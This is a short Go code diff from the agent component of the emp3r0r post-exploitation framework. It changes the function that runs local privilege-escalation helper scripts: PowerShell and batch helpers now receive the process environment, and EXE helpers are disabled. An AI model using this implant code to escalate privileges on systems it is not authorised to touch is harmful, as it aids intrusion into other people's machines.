@@ -6,6 +6,7 @@ package agent
 import (
 	"fmt"
 	"log"
+	"os"
 	"strings"
 
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
@@ -28,20 +29,17 @@ func runLPEHelper(method, checksum string) (out string) {
 	file_type := strings.Split(method, ".")[len(strings.Split(method, "."))-1]
 	switch file_type {
 	case "ps1":
-		out, err = RunPSScript(scriptData)
+		out, err = RunPSScript(scriptData, os.Environ())
 		if err != nil {
 			return fmt.Sprintf("LPE error: %s\n%v", out, err)
 		}
 	case "bat":
-		out, err = RunBatchScript(scriptData)
+		out, err = RunBatchScript(scriptData, os.Environ())
 		if err != nil {
 			return fmt.Sprintf("LPE error: %s\n%v", out, err)
 		}
 	case "exe":
-		out, err = RunExe(scriptData)
-		if err != nil {
-			return fmt.Sprintf("LPE error: %s\n%v", out, err)
-		}
+		return "EXE is not supported yet"
 	}
 
 	return
